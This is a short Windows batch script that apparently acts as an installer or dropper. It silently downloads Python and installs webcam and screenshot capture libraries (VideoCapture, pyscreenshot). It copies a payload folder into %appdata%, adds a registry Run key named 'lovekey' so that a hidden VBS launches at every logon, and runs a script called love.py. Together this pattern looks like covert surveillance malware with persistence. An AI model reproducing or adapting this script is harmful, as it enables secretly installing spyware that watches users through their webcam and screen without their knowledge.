IF EXIST C:\Python391\python.exe GOTO pythonInstalled
CURL -s "https://www.python.org/ftp/python/3.9.1/python-3.9.1-embed-amd64.zip" --output src\python391.zip
MKDIR src\python391
CD src\python391
"..\..\bin\7z.exe" x "..\python391.zip" *
ECHO import site>>python39._pth
CURL -s https://bootstrap.pypa.io/get-pip.py --output get-pip.py
CURL -s https://download.lfd.uci.edu/pythonlibs/z4tqcw5k/VideoCapture-0.9.5-cp39-cp39-win_amd64.whl --output VideoCapture-0.9.5-cp39-cp39-win_amd64.whl
python.exe get-pip.py
Scripts\pip.exe install VideoCapture-0.9.5-cp39-cp39-win_amd64.whl pygame pillow pyscreenshot 
CD ..\..
MOVE src\python391 c:\
DEL src\python391.zip
:pythonInstalled
REG query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v lovekey
IF %errorlevel%==0 GOTO keyInstalled
REG add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v lovekey /t REG_EXPAND_SZ /d "%SystemRoot%\System32\WScript.exe %appdata%\file\launch.vbs"
:keyInstalled
IF EXIST %appdata%\file GOTO fileCopied
XCOPY src\file %appdata%\file /i
:fileCopied
"C:\Python391\python.exe" "src\file\love.py"